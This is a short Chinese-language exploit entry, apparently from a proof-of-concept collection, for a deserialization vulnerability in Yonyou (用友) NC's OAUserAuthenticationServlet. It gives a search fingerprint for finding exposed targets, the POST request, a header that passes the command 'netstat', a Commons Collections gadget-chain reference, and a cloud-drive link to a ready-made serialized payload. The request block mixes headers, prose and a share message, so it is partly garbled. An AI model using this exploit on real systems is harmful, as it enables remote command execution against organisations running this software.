# 用友NCOAUserAuthenticationServlet存在反序列化漏洞

- **系统**：用友　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /servlet/OAUserAuthenticationServlet?pageId=login HTTP/1.1`

**请求体 / payload**
```
使用[Commons Collections3中的ChainedTransformer链](http://www.baidu.com/link?url=d27E9ON6cKUeKU6Ttray9CcQu7RlB0ZIswpQ0SnN01yvJwrWyL8eaqzrr44ozvdKiT0MLZ9hn7yTo6GdY-iH8iDGdmC0emLqcren9q_KpPK)
Host:
Content-Type: application/x-java-serialized-object
X-Authorization: netstat
{{file(C:\path\path\payload.ser)}}
我用夸克网盘给你分享了「用友NC OAUserAuthenticationServlet-反序列化Payloadser.zip」，点击链接或复制整段内容，打开「夸克APP」即可获取。
/~102438lHKn~:/
链接：https://pan.quark.cn/s/e0d5fa56a31f
```
- **预期**：200　|　—